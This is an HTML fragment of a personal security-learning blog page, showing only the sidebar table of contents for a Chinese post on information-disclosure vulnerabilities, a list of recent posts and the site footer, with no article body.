class="length-num">14</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">12</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div><a id="card-info-btn" href="https://cyan5s.github.io/"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8E%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%B3%84%E9%9C%B2"><span class="toc-number">1.1.</span> <span class="toc-text">一、服务器与中间件泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%98%E8%AE%A4%E9%94%99%E8%AF%AF%E9%A1%B5%E9%9D%A2%E4%B8%8E%E8%B0%83%E8%AF%95%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.1.</span> <span class="toc-text">默认错误页面与调试信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E5%88%97%E8%A1%A8%EF%BC%88Directory-Listing%EF%BC%89"><span class="toc-number">1.1.2.</span> <span class="toc-text">目录列表（Directory Listing）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%97%E4%BD%99%E4%B8%8E%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.3.</span> <span class="toc-text">冗余与备份文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP%E5%93%8D%E5%BA%94%E5%A4%B4%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.4.</span> <span class="toc-text">HTTP响应头信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E9%80%BB%E8%BE%91%E6%B3%84%E9%9C%B2"><span class="toc-number">1.2.</span> <span class="toc-text">二、应用程序逻辑泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E8%BE%93%E5%85%A5%E5%AF%BC%E8%87%B4%E7%9A%84%E9%94%99%E8%AF%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">1.2.1.</span> <span class="toc-text">用户输入导致的错误泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E4%B8%8E%E6%95%B0%E6%8D%AE%E6%9E%9A%E4%B8%BE"><span class="toc-number">1.2.2.</span> <span class="toc-text">用户与数据枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#API%E5%93%8D%E5%BA%94%E8%BF%87%E5%BA%A6"><span class="toc-number">1.2.3.</span> <span class="toc-text">API响应过度</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E4%BA%91%E4%B8%8E%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8A%A1%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF"><span class="toc-number">1.3.</span> <span class="toc-text">三、云与第三方服务配置错误</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%91%E5%AD%98%E5%82%A8%E6%A1%B6%E5%85%AC%E5%BC%80%E8%AE%BF%E9%97%AE"><span class="toc-number">1.3.1.</span> <span class="toc-text">云存储桶公开访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%AC%E5%BC%80%E7%9A%84%E7%9B%91%E6%8E%A7%E4%B8%8E%E8%B0%83%E8%AF%95%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.3.2.</span> <span class="toc-text">公开的监控与调试端口</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9E%E6%88%98"><span class="toc-number">2.</span> <span class="toc-text">实战</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/22/%E4%B8%8B%E6%96%AD%E7%82%B9%E7%9A%84%E6%96%B9%E6%B3%95/" title="下断点的方法">下断点的方法</a><time datetime="2025-11-22T03:52:26.000Z" title="Created 2025-11-22 11:52:26">2025-11-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/22/OD%E8%84%B1%E5%A3%B3/" title="OD脱壳">OD脱壳</a><time datetime="2025-11-22T03:45:01.000Z" title="Created 2025-11-22 11:45:01">2025-11-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/21/%E4%BD%9C%E5%93%81%E9%9B%86/" title="作品集">作品集</a><time datetime="2025-11-21T11:46:02.000Z" title="Created 2025-11-21 19:46:02">2025-11-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/16/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/" title="信息泄露漏洞学习1">信息泄露漏洞学习1</a><time datetime="2025-10-16T12:30:21.000Z" title="Created 2025-10-16 20:30:21">2025-10-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/16/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" title="信息搜集">信息搜集</a><time datetime="2025-10-16T12:30:18.000Z" title="Created 2025-10-16 20:30:18">2025-10-16</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By cyan5s</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.0.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.0</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
